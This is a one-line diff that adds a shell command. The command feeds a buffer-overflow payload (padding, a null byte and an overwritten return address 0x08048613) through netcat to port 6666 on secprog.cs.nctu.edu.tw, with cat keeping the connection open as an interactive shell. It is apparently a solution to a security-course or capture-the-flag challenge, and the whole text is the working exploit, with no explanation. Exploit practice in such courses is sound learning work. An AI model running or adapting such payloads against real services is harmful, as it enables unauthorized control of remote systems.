@@ -1,0 +1,1 @@
+(python -c 'print "a"*4 + "\n" + "\x00" + "a"*71 + "\x13\x86\x04\x08"';cat) | nc secprog.cs.nctu.edu.tw 6666
